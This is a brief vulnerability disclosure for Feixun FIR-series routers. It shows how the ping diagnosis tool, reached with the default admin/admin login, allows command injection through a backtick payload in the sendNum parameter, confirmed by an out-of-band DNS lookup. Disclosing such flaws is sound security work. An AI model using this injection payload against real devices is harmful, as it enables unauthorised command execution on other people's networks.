The FIR151B A2、FIR302E A2、FIR300B A2 and so on routers has remote command execution

1. Login feixun FIR151B A2 router by default password admin /admin

2. Find the system tool → system diagnosis → Ping → Number of Ping packages. There is remote command execution at ping
![image](https://user-images.githubusercontent.com/96364879/182764818-1354beae-c366-4a9d-93f9-1d6f93d66bb0.png)

3. Enter the website IP at the IP address / domain name, for example: 8.8.8.8

4. Click Start diagnosis

5. Use burpsuite intercept and change sendNum argument to 4\`ping -c 2 1q2w3e.r4y19h.dnslog.cn\`, forward this request
![image](https://user-images.githubusercontent.com/96364879/182764708-02187474-579e-49ae-981f-b97c430ed02c.png)

6. See the dnslog results. The command has been executed successfully
![image](https://user-images.githubusercontent.com/96364879/182764779-28d2b740-6d67-42e5-9e24-0bc5c76cb4d6.png)
